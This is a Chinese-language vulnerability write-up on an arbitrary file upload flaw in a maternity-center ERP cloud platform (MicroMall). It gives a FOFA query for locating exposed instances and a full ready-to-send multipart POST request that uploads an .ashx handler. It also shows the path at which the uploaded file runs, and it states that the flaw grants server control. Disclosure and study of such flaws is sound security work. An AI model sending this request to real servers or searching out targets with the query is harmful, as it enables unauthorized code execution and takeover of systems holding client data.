# 月子会所ERP管理云平台MicroMall任意文件上传漏洞

# <font style="color:#080808;background-color:#ffffff;">一、漏洞简介</font>
<font style="color:#080808;background-color:#ffffff;">月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。</font>

# <font style="color:#080808;background-color:#ffffff;">二、影响版本</font>
+ <font style="color:#080808;background-color:#ffffff;">月子会所ERP管理云平台</font>

# <font style="color:#080808;background-color:#ffffff;">三、资产测绘</font>
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面

![1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab.png](./img/2A2L2yMRDv9y46Wn/1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab-592933.png)

# <font style="color:#080808;background-color:#ffffff;">四、漏洞复现</font>
```plain
POST /Page/MicroMall/ashx/Handler.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_301
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 497
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--

```

 ![1695624260746-8f31f546-1db6-4588-a8af-5f1c5fb8c5b7.png](./img/2A2L2yMRDv9y46Wn/1695624260746-8f31f546-1db6-4588-a8af-5f1c5fb8c5b7-201678.png)

根据回显拼接上传文件位置

```plain
/UploadBaseFolder/Supplier/2309257009803.ashx
```

![1695624304526-6dd9baf6-7830-4d28-bc2d-c85ff4095716.png](./img/2A2L2yMRDv9y46Wn/1695624304526-6dd9baf6-7830-4d28-bc2d-c85ff4095716-950463.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nh8grdm3xibcft50>